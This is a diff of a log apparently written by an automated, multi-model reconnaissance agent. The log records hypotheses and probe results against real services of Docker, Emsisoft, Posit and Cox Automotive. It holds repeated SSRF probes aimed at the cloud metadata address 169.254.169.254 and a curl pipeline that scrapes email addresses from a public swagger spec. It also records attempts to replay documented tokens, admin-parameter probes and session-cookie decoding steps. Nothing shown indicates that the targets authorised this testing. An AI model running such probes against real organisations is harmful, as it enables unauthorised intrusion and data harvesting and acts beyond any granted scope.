@@ -802,7 +802,6 @@ https://status.duocircle.com [[35mHSTS[0m]
 === MY STATE ===
 {"phase":"RECON"}
 === MY LAST LEADS (tail) ===
-evidence_needed: 1. Decode dckr-sessid cookie structure. 2. Confirm version header format across multiple requests. 3. Check if trace IDs are sequential (predictable).
 verify_steps: 1. curl -s -D - https://auth.docker.com/ 2>&1 | grep -E 'x-docker-app|x-trace|dckr-sessid'. 2. Decode cookie: echo "ImJsVkhmMHlqVDA2TGNpS0pSSm1RUHci" | base64 -d 2>/dev/null.
 impact: Severity LOW — Version/build information disclosure aids targeted exploitation. Session structure observation may reveal weaknesses if HMAC key is derivable.
 testability: PASSIVE
@@ -862,13 +861,8 @@ testability: PASSIVE
 ## 2026-08-22 05:33:06 UTC (model mimo)
 ## 2026-08-22 05:56:36 UTC (model mimo)
 ## 2026-08-22 06:50:31 UTC (model mimo)
+## 2026-08-22 07:37:10 UTC (model mimo)
 === AGGREGATED HYPOTHESES (tail) ===
-- LEARN: REJECTED SSRF @ https://docker-registry.docker
-
-## RANKED HYPOTHESES 2026-08-22 03:48:44 UTC
-- (no NEW hypotheses this cycle — all deduped)
-- NEXT(hypotheses-mimo.txt): PROBE: curl -s https://api.emsisoft.com/swagger/v1.0/swagger.json | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u — extract all email addr
-- NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - LEARN: REJECTED AUTH @ api.emsisoft.com: All 15 tested UUID tokens from swagger spec return 401 on /v1/account — example tokens are fabricated documentation, not real 
 - LEARN: ACCEPTED MISCONFIG @ api.emsisoft.com/swagger/v1.0/swagger.json: 65 endpoints, 353 GUIDs, email addresses, and billing data structures publicly accessible (reco
@@ -903,14 +897,13 @@ testability: PASSIVE
 - NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
 - LEARN: REJECTED SSRF @ https://docker-registry.docker
+
+## RANKED HYPOTHESES 2026-08-22 07:37:20 UTC
+- (no NEW hypotheses this cycle — all deduped)
+- NEXT(hypotheses-qwen14b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
+- NEXT(hypotheses-qwen8b.txt): PROBE https://docker-registry.docker.com/v2/?param=http://169.254.169.254
+- LEARN: REJECTED SSRF @ https://docker-registry.docker
 === LATEST ROBOT PROBE RESULTS ===
-https://api.emsisoft.com/swagger/v1.0/swagger.json -> 200 len=? type=application/json;charset=utf-8
-https://api.emsisoft.com/v1/account -> HTTP 401
-https://api.emsisoft.com/v1/workspaces/<guid -> HTTP 404
-https://api.secrets.staging.posit.cloud/ -> HTTP 404
-https://api.secrets.staging.posit.cloud/health -> HTTP 404
-https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
-https://api.coxautoinc.com/endpoint?param=admin&token=123 -> HTTP 403
 
 ## 2026-08-22 03:00:34 UTC
 https://docker-registry.docker.com/v2/?param=169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
@@ -959,6 +952,13 @@ https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlo
 https://api.coxautoinc.com/endpoint?param=admin&token=123 -> HTTP 403
 
 ## 2026-08-22 06:50:39 UTC
+https://docker-registry.docker.com/v2/?param=169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
+https://api.coxautoinc.com/endpoint?param=admin -> HTTP 403
+https://github.com/posit/.github/workflows -> HTTP 404
+https://docker-registry.docker.com/v2/?param=http://169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
+https://api.coxautoinc.com/endpoint?param=admin&token=123 -> HTTP 403
+
+## 2026-08-22 07:37:21 UTC
 https://docker-registry.docker.com/v2/?param=169.254.169.254 -> ERR <urlopen error [Errno -2] Name or service not know
 https://api.coxautoinc.com/endpoint?param=admin -> HTTP 403
 https://github.com/posit/.github/workflows -> HTTP 404
